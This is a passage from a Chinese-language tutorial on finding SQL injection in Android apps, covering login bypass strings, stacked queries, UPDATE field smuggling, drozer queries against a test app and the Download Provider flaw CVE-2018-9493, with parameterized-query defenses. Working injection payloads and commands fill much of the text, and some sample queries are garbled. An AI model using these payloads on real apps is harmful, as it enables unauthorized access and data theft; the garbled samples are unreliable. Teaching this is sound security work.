+<h5 id="lt-1-gt-盲注入"><a href="#lt-1-gt-盲注入" class="headerlink" title="&lt;1&gt;盲注入"></a>&lt;1&gt;盲注入</h5><p>当程序员忘记隐藏导致数据库应用程序不安全的错误消息时，就会发生这种类型的SQLIA，这种错误消息通过SQL语句询问一系列逻辑问题来帮助SQLIA危及数据库。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT pass FROM userTable WHERE username=<span class="string">&#x27;user&#x27;</span> and <span class="number">1</span> =<span class="number">0</span> -- <span class="type">AND</span> <span class="variable">pass</span> <span class="operator">=</span> AND pin= <span class="number">0</span></span><br><span class="line">SELECT info FROM userTable WHERE username=<span class="string">&#x27;user&#x27;</span> and = <span class="number">1</span> -- <span class="type">AND</span> <span class="variable">pass</span> <span class="operator">=</span> AND pass= <span class="number">0</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="lt-2-gt-定时攻击"><a href="#lt-2-gt-定时攻击" class="headerlink" title="&lt;2&gt;定时攻击"></a>&lt;2&gt;定时攻击</h5><p>这种类型的攻击允许攻击者通过观察数据库响应中的定时延迟来从数据库中收集信息。 这类攻击利用if条件语句来达到延时的目的。 WAITFOR是分支上的关键字，它导致数据库将其响应延迟指定的时间。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">declare @ varchar (<span class="number">8000</span>) select <span class="meta">@s</span> =db_name (<span class="keyword">if</span> (ascii (substring (<span class="meta">@s</span>,<span class="number">1</span>,<span class="number">1</span>))&amp;(power (<span class="number">2</span>,o) &gt; o waitfor delay <span class="string">&#x27;0:0:5&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="（7）交替编码"><a href="#（7）交替编码" class="headerlink" title="（7）交替编码"></a>（7）交替编码</h4><p>当攻击者通过使用替代编码（如十六进制、ASCII和Unicode）修改注入查询时，就会发生此类攻击。 通过这种方式，攻击者可以逃离开发人员的过滤器，该过滤器扫描输入查询以查找特定的已知“坏字符”。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT accounts FROM userTable WHERE login=<span class="string">&quot;AND pin=0; exec (char(0x73687574646f776e)</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="4-Andorid-APP-SQL漏洞常见的测试点"><a href="#4-Andorid-APP-SQL漏洞常见的测试点" class="headerlink" title="4.Andorid APP SQL漏洞常见的测试点"></a>4.Andorid APP SQL漏洞常见的测试点</h3><p>Android APP SQL注入漏洞一般位于APP的用户登录，充值页面，修改银行卡，提交留言反馈，商品购买，提现功能等地方</p>
+<h2 id="三、常见的SQL漏洞"><a href="#三、常见的SQL漏洞" class="headerlink" title="三、常见的SQL漏洞"></a>三、常见的SQL漏洞</h2><p>这里我们使用一个漏洞样本来详细的讲解APP SQL注入漏洞的情况</p>
+<h3 id="1-重言式攻击"><a href="#1-重言式攻击" class="headerlink" title="1.重言式攻击"></a>1.重言式攻击</h3><h4 id="（1）漏洞原理"><a href="#（1）漏洞原理" class="headerlink" title="（1）漏洞原理"></a>（1）漏洞原理</h4><p>我们前面讲了，可以使用<code>(1=1)或（--）</code>来绕过身份验证，我们知道一般SQL语句登录构造如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Select * From 用户表 Where UserName=xxx and Password=xxx</span><br></pre></td></tr></table></figure>
+
+<p>然后判断返回的行数，如果有返回行，证明账号和密码是正确的，即登录成功，而这样的语句的话</p>
+<p>那么我们可以在登录账户或密码后面加上<code>（1=1）</code>，因为1&#x3D;1登录条件永远成立，而<code>--</code>作为内嵌评论的开始字符，会导致后面内容只作为评论，这样就可以不去验证密码的有效性</p>
+<h4 id="（2）漏洞复现"><a href="#（2）漏洞复现" class="headerlink" title="（2）漏洞复现"></a>（2）漏洞复现</h4><p>我们打开应用</p>
+<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/2.png" alt="image-20220710153441324"></p>
+<p>这里很显然是一个登录界面，APP会通过用户输入的账号和密码，去查询数据库中用户进行匹配，我们进一步进行静态分析</p>
+<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/3.png" alt="image-20220710153652015"></p>
+<p>不难找到这句语句是APP进行数据库查询的语句，我们可以进行进一步分析</p>
+<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/4.png" alt="image-20220710153916860"></p>
+<p>不难发现这里我们如果在不知道密码情况下，随意输入，APP会根据账号和密码构造一个有效的负载来避免检测</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; WHERE NAME=&#x27;&quot; <span class="operator">+</span> username <span class="operator">+</span> &quot;&#x27; AND PASSWORD=&#x27;&quot; <span class="operator">+</span> password <span class="operator">+</span> &quot;&#x27;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>因此我们可以使用<code>（1=1）</code>和<code>--</code>两种方式来进行sql注入绕过验证</p>
+<p><code>--</code></p>
+<p>我们使用<code>--</code>来构造语句，无非是使得不会去检测密码的有效性，所以我们可以构造语句</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> employee <span class="keyword">WHERE</span> NAME<span class="operator">=</span><span class="string">&#x27;Admin&#x27;</span> <span class="comment">-- AND PASSWORD = &#x27;xyz&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>这样会是的我们将查询语句构造成上面语句，APP就不会去验证密码，而我们又输入的是管理员账号，所以可以尝试进行sql注入绕过</p>
+<p>构造账号和密钥：账号<code>Admin&#39; --</code> 密钥：<code>Anything</code></p>
+<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/5.png" alt="image-20220710154643896"></p>
+<p>这样就成功的绕过了验证，获得具体信息</p>
+<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/6.png" alt="image-20220710154806710"></p>
+<p>我们还可以查询账号密钥相应的详细</p>
+<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/7.png" alt="image-20220710154852745"></p>
+<p>同理我们使用（1&#x3D;1）方式来进行注入</p>
+<p><code>1=1</code></p>
+<p>我们使用<code>1=1</code>来进行注入，无非是相在输入账户情况下，可以输入任意的密码，这样我们只需要使用(OR <code>&#39;1&#39;=&#39;1&#39;</code>)即可</p>
+<p>可以构造SQL语句：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> employee <span class="keyword">WHERE</span> NAME<span class="operator">=</span><span class="string">&#x27;Admin&#x27;</span> <span class="keyword">OR</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;1&#x27;</span> <span class="keyword">AND</span> PASSWORD <span class="operator">=</span> <span class="string">&#x27;anything&#x27;</span> <span class="keyword">OR</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;1&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>构造账号和密钥：账号：<code>Admin&#39; OR &#39;1&#39;=&#39;1</code> 密钥：<code>anything&#39; OR &#39;1&#39;=&#39;1</code></p>
+<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/8.png" alt="image-20220710155537289"></p>
+<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/9.png" alt="image-20220710155557758"></p>
+<p>同理成功进入 上面账号和密码可以为任意值</p>
+<h3 id="2-Piggy-backed查询"><a href="#2-Piggy-backed查询" class="headerlink" title="2.Piggy-backed查询"></a>2.Piggy-backed查询</h3><h4 id="（1）漏洞原理-1"><a href="#（1）漏洞原理-1" class="headerlink" title="（1）漏洞原理"></a>（1）漏洞原理</h4><p>我们上面已经简单的绕过了该攻击，我们可以使用<code>;</code>来进行Piggy-backed查询，这样可以使得在登录系统的同时，再进行执行一条SQL语句</p>
+<h4 id="（2）漏洞复现-1"><a href="#（2）漏洞复现-1" class="headerlink" title="（2）漏洞复现"></a>（2）漏洞复现</h4><p>我们可以构造SQL语句：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> employee <span class="keyword">WHERE</span> NAME<span class="operator">=</span><span class="string">&#x27;anyname&#x27;</span> <span class="keyword">OR</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;1&#x27;</span>;<span class="keyword">INSERT</span> <span class="keyword">INTO</span> employee (NAME, ID) <span class="keyword">VALUES</span> (<span class="string">&#x27;MUR&#x27;</span>,<span class="string">&#x27;11451&#x27;</span>) <span class="comment">-- AND PASSWORD = &#x27;anything&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>上面的语句实现三个功能：构造任意的用户名，插入新的sql语句，使得验证码无效</p>
+<p>构造用户名和密码：用户名：<code>anyname&#39; OR &#39;1&#39;=&#39;1&#39;; INSERT INTO employee (NAME, ID) VALUES (&#39;MUR&#39;,&#39;11451&#39;) --</code> 密码：<code>anything</code></p>
+<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/10.png" alt="image-20220710161338483"></p>
+<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/11.png" alt="image-20220710161653071"></p>
+<p>这里我们发现成功的登录，但是并没有插入用户名成功，经过分析，在大多数<a target="_blank" rel="noopener" href="https://developer.android.com/reference/android/database/sqlite/SQLiteDatabase.html#execSQL(java.lang.String)">SQLiteDatabase API</a>中<code>;</code>被定义为终止，所以它之后的任何内容都应该被忽略，但是这也是在一些APP中可以进行测试的环节，当我们理解<code>;</code>作用后，很明显我们又可以得到一种绕过登录的方法，这里既然<code>;</code>后面都无效，是不是意味，我们只要输入正确账户，就可以登录</p>
+<p>构造SQL语句：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> employee <span class="keyword">WHERE</span> NAME<span class="operator">=</span><span class="string">&#x27;Admin&#x27;</span>;  <span class="keyword">AND</span> PASSWORD <span class="operator">=</span> <span class="string">&#x27;anything&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>构造账号和密码：账号<code>Admin&#39;;</code>，密码：<code>Anything</code> </p>
+<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/12.png" alt="image-20220710162127368"></p>
+<p>同样成功登录</p>
+<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/13.png" alt="image-20220710162156625"></p>
+<h3 id="3-逻辑错误攻击"><a href="#3-逻辑错误攻击" class="headerlink" title="3.逻辑错误攻击"></a>3.逻辑错误攻击</h3><h4 id="（1）漏洞原理-2"><a href="#（1）漏洞原理-2" class="headerlink" title="（1）漏洞原理"></a>（1）漏洞原理</h4><p>原本逻辑错误攻击是利用数据库为错误查询返回的错误消息，这些数据库错误消息通常包含有用的信息，使攻击者能够发现应用程序和数据库架构中的易受攻击的参数。而我们这里发现在数据字段校验时，通过插入多余的字段，来实现越权的功能</p>
+<h4 id="（2）漏洞复现-2"><a href="#（2）漏洞复现-2" class="headerlink" title="（2）漏洞复现"></a>（2）漏洞复现</h4><p>这里我们分析到数据库更新的语句</p>
+<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/14.png" alt="image-20220710163213985"></p>
+<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/15.png" alt="image-20220710163233575"></p>
+<p>通过这里的更新语句我们可以很明显的得到构造的SQL</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> employee <span class="keyword">SET</span> NICKNAME<span class="operator">=</span>..., EMAIL <span class="operator">=</span>..., ADDRESS<span class="operator">=</span>..., PASSWORD <span class="operator">=</span>..,               PHONE<span class="operator">=</span><span class="string">&#x27;...&#x27;</span> <span class="keyword">WHERE</span> ID <span class="operator">=</span> (...)</span><br></pre></td></tr></table></figure>
+
+<p>这里我们模拟一般的管理系统，很显然只能管理员对员工的一些信息进行修改，比如薪资，而员工只能修改一般的字段，我们这里通过普通用户模式登陆</p>
+<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/16.png" alt="image-20220710163736745"></p>
+<p>可以很明显发现，这里的薪资是无法进行修改的，那我们通过添加字段利用逻辑错误来实现修改</p>
+<p>构造SQL:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> employee <span class="keyword">SET</span> NICKNAME<span class="operator">=</span>..., EMAIL <span class="operator">=</span>..., ADDRESS<span class="operator">=</span>..., PASSWORD <span class="operator">=</span>..,               PHONE<span class="operator">=</span><span class="string">&#x27;21389&#x27;</span>, SALARY<span class="operator">=</span><span class="string">&#x27;100000000&#x27;</span> </span><br><span class="line"><span class="keyword">WHERE</span> ID <span class="operator">=</span> (Alice.id)</span><br></pre></td></tr></table></figure>
+
+<p>我们这里修改Phone的字段：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">21389</span><span class="string">&#x27;, SALARY=&#x27;</span><span class="number">100000000</span></span><br></pre></td></tr></table></figure>
+
+<p>这样就多加了一个字段，但是我们对上面代码逻辑进行分析，发现只是对字符串进行读取，并未校验</p>
+<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/17.png" alt="image-20220710164102899"></p>
+<p>点击更新</p>
+<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/18.png" alt="image-20220710164124887"></p>
+<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/19.png" alt="image-20220710164202529"></p>
+<p>再次进入我们就发现薪资变为了我们预设的数字</p>
+<p>当然利用上面的实现我们还能修改用户名，比如：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> employee <span class="keyword">SET</span> NICKNAME<span class="operator">=</span>..., EMAIL <span class="operator">=</span>..., ADDRESS<span class="operator">=</span>..., PASSWORD <span class="operator">=</span>..,               PHONE<span class="operator">=</span><span class="string">&#x27;21389&#x27;</span>, SALARY<span class="operator">=</span><span class="number">100000000</span></span><br><span class="line"><span class="keyword">WHERE</span> NAME <span class="operator">=</span> <span class="string">&#x27;Boby&#x27;</span> <span class="comment">-- &#x27; WHERE ID = (Alice.id)</span></span><br></pre></td></tr></table></figure>
+
+<p>我们构造语句：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">21389</span><span class="string">&#x27;, SALARY=10000000 WHERE NAME=&#x27;</span>Bobby<span class="string">&#x27; --</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/20.png" alt="image-20220710165113539"></p>
+<p>更新成功后，我们进入Bobby的信息，发现就被修改了</p>
+<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/21.png" alt="image-20220710165227929"></p>
+<h3 id="4-漏洞的挖掘思路"><a href="#4-漏洞的挖掘思路" class="headerlink" title="4.漏洞的挖掘思路"></a>4.漏洞的挖掘思路</h3><p>我们前面讲了三种常见类型的SQL注入的案例，但是我们在实际挖掘过程中，怎么初步的判断是否存在这类漏洞，并进行使用</p>
+<p>我们打开另外一个样本APK</p>
+<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/25.png" alt="image-20220710171128029"></p>
+<p>我们知道并不是所有APK样本，我们都能很轻易的获得源码，有些可能使用了加壳服务，但是测试上述的漏洞很容易</p>
+<p>我们都知道SQL注入需要单引号配对，我们可以根据日志和错误提示来查看</p>
+<p>首先我们先进行日志监听或使用ddms</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb logcat |grep packagename</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/26.png" alt="image-20220710171544841"></p>
+<p>然后我们输入一个单引号<code>&#39;</code></p>
+<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/27.png" alt="image-20220710171759976"></p>
+<p>很明显说明这里是存在SQL注入，说明程序是有从Sqlite中获取信息，但由于我们输入<code>&#39;</code>引号，没有配对，导致程序错误</p>
+<p>然后我们再输入双引号<code>&#39;&#39;</code></p>
+<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/28.png" alt="image-20220710172000010"></p>
+<p>程序正在搜索输入的数据，没有产生SQL错误。为了进一步确认，我们再加一个单引号，看看是否会引发SQL错误</p>
+<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/29.png" alt="image-20220710172107288"></p>
+<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/30.png" alt="image-20220710172135897"></p>
+<p>程序再次报错，说明奇数个<code>&#39;</code>会导致SQL错误，当引号刚好匹配时SQL查询正好会执行</p>
+<p>然后我们就可以使用我们上面的漏洞来进行测试，我们使用一个万能语句，即无论正确错误都输入的语句</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; or &#x27;</span><span class="number">1</span><span class="string">&#x27; !=&#x27;</span><span class="number">2</span></span><br></pre></td></tr></table></figure>
+
+<p>无论是ture还是flase我们都满足，即万能语句</p>
+<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/31.png" alt="image-20220710172419976"></p>
+<p>这里我们就成功的爆出了相关信息</p>
+<p>这里很显然是app接收了用户的输入，没有经过验证就直接加入到SQL查询语句</p>
+<h3 id="5-安全防护"><a href="#5-安全防护" class="headerlink" title="5.安全防护"></a>5.安全防护</h3><p>针对1-3的漏洞现象，样本中依次进行了安全防护</p>
+<p><strong>针对1-2的防护：</strong></p>
+<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/22.png" alt="image-20220710165651424"></p>
+<p>上图中2表示防护的代码</p>
+<p><strong>针对3的防护：</strong></p>
+<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/23.png" alt="image-20220710165822151"></p>
+<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/24.png" alt="image-20220710165913808"></p>
+<p>我们可以发现上传的防护方式，都使用了<code>?</code>, 问号<code>?</code>是 SQL 查询中的参数持有者，将使用 String ListArray 中给出的相应参数进行编译，即会对输入的参数进行转义和绑定，这样就可以有效的进行参数输入防护</p>
+<h2 id="四、Content-Provider上Sql注入漏洞"><a href="#四、Content-Provider上Sql注入漏洞" class="headerlink" title="四、Content Provider上Sql注入漏洞"></a>四、Content Provider上Sql注入漏洞</h2><p>我在<a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-269447.htm">Android APP漏洞之战（4）——Content漏洞详解</a>已经初步介绍了Content Provider中存在的sql注入漏洞，我们知道Android中provider提供不同进程之间共享内容，而content在查询的过程中也会存在一些典型的Sql注入漏洞</p>
+<h3 id="1-漏洞原理"><a href="#1-漏洞原理" class="headerlink" title="1.漏洞原理"></a>1.漏洞原理</h3><p>Content Provider SQL注入漏洞产生的因如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Content Provider组件是可导出的未校验输入值是否符舍规范，就作为SQL语句的一部分，例如：</span><br><span class="line"><span class="type">String</span> <span class="variable">inputUserName</span> <span class="operator">=</span> <span class="string">&quot;123&#x27;or&#x27;1=1&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">inputPassword</span> <span class="operator">=</span> <span class="string">&quot;123&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select *from user where username=&#x27;&quot;</span>+inputUserName +<span class="string">&quot;&#x27; and password=&#x27;&quot;</span>+inputPassword+<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line"><span class="type">Cursor</span> <span class="variable">cursor</span> <span class="operator">=</span> db.rawQuery(sql);</span><br><span class="line">以上两点均满足的情况下，就会产生SQL注入风险</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-漏洞检测"><a href="#2-漏洞检测" class="headerlink" title="2.漏洞检测"></a>2.漏洞检测</h3><p>我们挖掘Content Provider漏洞的步骤：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">（1）扫描全局代码，是否存在导出的Content Provider组件</span><br><span class="line">（2）若存在导出的Content Provider组件，则判断SQL语句中是否有未校验的输入值，若存在则存在风险。</span><br><span class="line">（3）汇总结果</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-漏洞复现"><a href="#3-漏洞复现" class="headerlink" title="3.漏洞复现"></a>3.漏洞复现</h3><p>我们使用drozer扫描注入的位置：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run scanner.provider.injection -a &lt;包名&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/32.png" alt="image-20220710165913808"></p>
+<p>然后我们执行以下命令，发现返回了报错信息，接着构造sql获取敏感数据</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run app.provider.query content:<span class="comment">//com.mwr.example.sieve.DBContentProvider/Passwords/ --projection &quot;&#x27;&quot;</span></span><br><span class="line">run app.provider.query content:<span class="comment">//com.mwr.example.sieve.DBContentProvider/Passwords/ --projection &quot; * from Key;--+&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/33.png" alt="image-20220710165913808"></p>
+<p>列出所有表信息：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.provider.query content:<span class="comment">//com.mwr.example.sieve.DBContentProvider/Passwords/ --projection &quot;* FROM SQLITE_MASTER WHERE type=&#x27;table&#x27;;--&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/34.png" alt="image-20220710165913808"></p>
+<p>获取具体表信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection &quot;* FROM Key;--&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/35.png" alt="image-20220710165913808"></p>
+<p>列出该app的表信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run scanner.provider.sqltables -a  com.mwr.example.sieve</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/36.png" alt="image-20220710165913808"></p>
+<h3 id="4-安全防护"><a href="#4-安全防护" class="headerlink" title="4.安全防护"></a>4.安全防护</h3><p>（1）不需要导出的Content Provider组件，建议显示设置组件的“android:exported”属性为false</p>
+<p>（2）当组件可导出时，建议使用selectionArgs进行参数化组成SQL语句，例如：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">inputUserName</span> <span class="operator">=</span> <span class="string">&quot;xxxx&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">inputPassword</span> <span class="operator">=</span> <span class="string">&quot;xxxx&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select *from user where username=? and password=?&quot;</span>;</span><br><span class="line"><span class="type">Cursor</span> <span class="variable">cursor</span> <span class="operator">=</span> db.rawQuery(sql,<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;username,password&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>我们可以发现Content Provider上的sql漏洞核心原理和上面是一样的</p>
+<h2 id="五、Android-Download-Provider上sql注入漏洞"><a href="#五、Android-Download-Provider上sql注入漏洞" class="headerlink" title="五、Android Download Provider上sql注入漏洞"></a>五、Android Download Provider上sql注入漏洞</h2><p>Android Download Provider是用来进行下载的一个重要组件，Android提供了一套处理其他App下载请求的机制，例如浏览器的下载、邮件附件的下载、OTA升级包下载等。其中Download Manager用来处理下载请求，DownloadManager下载过程中，会将下载的数据和下载的状态插入ContentProvider中，完成下载后使用ContentProvider来提供下载内容给请求方APP。</p>
+<p>下载的流程关系图：</p>
+<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/38.png" alt="image-20220710193502503"></p>
+<h3 id="1-CVE-2018-9493-Download-Provider-SQL注入"><a href="#1-CVE-2018-9493-Download-Provider-SQL注入" class="headerlink" title="1.CVE-2018-9493: Download Provider SQL注入"></a>1.CVE-2018-9493: Download Provider SQL注入</h3><h4 id="（1）漏洞原理-3"><a href="#（1）漏洞原理-3" class="headerlink" title="（1）漏洞原理"></a>（1）漏洞原理</h4><p>通过利用SQL注入漏洞，未授予任何权限的恶意应用程序可以绕过当前实现的所有访问控制机制，从下载提供程序检索所有条目。 此外，被授予有限权限的应用程序（如Internet）也可以从不同的URI访问所有数据库内容。 对于Gmail、Chrome或Google Play Store等应用程序，从该提供程序检索的信息可能包括潜在的敏感信息，如文件名、描述、标题、路径、URL（在查询字符串中可能包含敏感参数）等。</p>
+<p>然而内部数据库中的某些列（例如<code>CookieData</code>）被认为是私有的，不能通过 Download Content Provider 直接访问，除非调用者具有不受限制的权限（URI 受<code>signatureOrSystem</code>访问级别保护）</p>
+<p>利用 where 表达式中的 SQL 注入，绕过<code>setStrict</code>过滤器，将允许我们从内部数据库中提取内容，包括任何受限制的列下载</p>
+<p>访问下载内容提供程序需要不同的权限，例如Internet或access_all_downloads，这取决于所请求的URI</p>
+<p>例如：</p>
+<p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/37.png" alt="image-20220710193502503"></p>
+<p>但是可以针对下面URL，则无需任何权限：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">content:<span class="comment">//downloads/public_downloads/#</span></span><br></pre></td></tr></table></figure>
+
+<p>我们可以在源码中查看对该URI的定义：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sURIMatcher.addURI(<span class="string">&quot;downloads&quot;</span>,</span><br><span class="line">   Downloads.Impl.PUBLICLY_ACCESSIBLE_DOWNLOADS_URI_SEGMENT + <span class="string">&quot;/#&quot;</span>,</span><br><span class="line">   PUBLIC_DOWNLOAD_ID);</span><br></pre></td></tr></table></figure>
+
+<p>可以看出该URI，可以用于公共下载，但没有什么可以阻止攻击者注入SQL Selection子句来访问数据库中的任何行、列或表，包括受保护的列。这样我们就可以进行SQL注入</p>
+<p>总结：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">不需要权限：</span><br><span class="line">content:<span class="comment">//downloads/public_downloads/#</span></span><br><span class="line">需要权限android.permission.INTERNET：</span><br><span class="line">content:<span class="comment">//downloads/my_downloads/</span></span><br><span class="line">content:<span class="comment">//downloads/my_downloads/#</span></span><br><span class="line">content:<span class="comment">//downloads/download/</span></span><br><span class="line">content:<span class="comment">//downloads/download/#</span></span><br></pre></td></tr></table></figure>
+
+<p>因此我们可以构造相关的sql注入语句：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell content query <span class="comment">--uri content://downloads/public_downloads/0 -- where &quot;1=1) OR (1=1&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里需要从Google Chrome下载任何文件（即PDF文件）或从Gmail下载任何附件，确保提供程序包含一些数据，然后使用该语句</p>
+<p>由于底层SQLiteQueryBuilder中强制使用严格模式，无法实现基于UNION语句的直接注入，但可以通过利用盲SQL注入提取所有信息：</p>
